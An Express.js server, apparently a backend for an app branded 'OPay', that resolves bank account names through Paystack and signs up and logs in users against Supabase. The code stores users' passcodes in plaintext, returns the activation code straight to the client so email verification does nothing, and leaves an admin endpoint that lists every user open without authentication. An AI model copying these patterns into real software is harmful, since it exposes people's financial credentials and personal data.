const express = require('express');
const cors = require('cors');
const dotenv = require('dotenv');
const { createClient } = require('@supabase/supabase-js');

dotenv.config();

const app = express();
app.use(cors());
app.use(express.json());

// ============ INITIALIZE SUPABASE ============
const supabase = createClient(
    process.env.SUPABASE_URL,
    process.env.SUPABASE_SERVICE_KEY
);

// ============ PAYSTACK KEY ============
const PAYSTACK_SECRET_KEY = process.env.PAYSTACK_SECRET_KEY;

console.log('✅ Server starting...');
console.log(`Supabase: ${process.env.SUPABASE_URL ? '✅' : '❌'}`);
console.log(`Paystack: ${PAYSTACK_SECRET_KEY ? '✅' : '❌'}`);

// ============ HEALTH CHECK ============
app.get('/', (req, res) => {
    res.json({ 
        message: 'OPay Backend API is running!',
        status: 'ok'
    });
});

// ============ RESOLVE ACCOUNT NAME ============
app.post('/api/resolve-account', async (req, res) => {
    const { account_number } = req.body;
    
    try {
        const response = await fetch(`https://api.paystack.co/bank/resolve?account_number=${account_number}&bank_code=999992`, {
            method: 'GET',
            headers: {
                'Authorization': `Bearer ${PAYSTACK_SECRET_KEY}`,
                'Content-Type': 'application/json'
            }
        });
        
        const data = await response.json();
        
        if (data.status) {
            res.json({
                success: true,
                account_name: data.data.account_name,
                account_number: data.data.account_number
            });
        } else {
            res.json({
                success: false,
                message: data.message || 'Account not found'
            });
        }
    } catch (error) {
        res.json({ success: false, message: 'Network error' });
    }
});

// ============ CHECK EMAIL ============
app.post('/api/check-email', async (req, res) => {
    const { email } = req.body;
    
    const { data } = await supabase
        .from('users')
        .select('email')
        .eq('email', email)
        .maybeSingle();
    
    res.json({ available: !data });
});

// ============ SEND ACTIVATION CODE ============
app.post('/api/send-activation', async (req, res) => {
    const { email, accountNumber, accountName } = req.body;
    const activationCode = Math.floor(10000 + Math.random() * 90000).toString();
    
    console.log(`📧 ${email} -> Activation Code: ${activationCode}`);
    
    res.json({ 
        success: true, 
        message: 'Activation code sent',
        code: activationCode
    });
});

// ============ VERIFY & CREATE USER ============
app.post('/api/verify-and-create', async (req, res) => {
    const { account_number, account_name, email, password_code, activation_code } = req.body;
    
    if (!activation_code || activation_code.length !== 5) {
        return res.json({ success: false, message: 'Invalid activation code' });
    }
    
    // Check if account exists
    const { data: existingAccount } = await supabase
        .from('users')
        .select('account_number')
        .eq('account_number', account_number)
        .maybeSingle();
    
    if (existingAccount) {
        return res.json({ success: false, message: 'Account number already registered' });
    }
    
    // Check if email exists
    const { data: existingEmail } = await supabase
        .from('users')
        .select('email')
        .eq('email', email)
        .maybeSingle();
    
    if (existingEmail) {
        return res.json({ success: false, message: 'Email already registered' });
    }
    
    // Create user
    const { error } = await supabase
        .from('users')
        .insert({
            account_number,
            account_name,
            email,
            password_code,
            platform: 'opay',
            is_active: true,
            email_verified: true
        });
    
    if (error) {
        return res.json({ success: false, message: error.message });
    }
    
    res.json({ 
        success: true, 
        message: 'Account created!',
        user: { account_number, account_name, email }
    });
});

// ============ LOGIN ============
app.post('/api/login', async (req, res) => {
    const { account_number, password_code } = req.body;
    
    const { data } = await supabase
        .from('users')
        .select('account_number, account_name, email')
        .eq('account_number', account_number)
        .eq('password_code', password_code)
        .maybeSingle();
    
    if (data) {
        res.json({ success: true, user: data });
    } else {
        res.json({ success: false, message: 'Invalid credentials' });
    }
});

// ============ ADMIN - GET ALL USERS ============
app.get('/api/admin/users', async (req, res) => {
    const { data } = await supabase
        .from('users')
        .select('id, account_number, account_name, email, created_at');
    
    res.json({ users: data || [] });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`✅ Server running on port ${PORT}`);
});
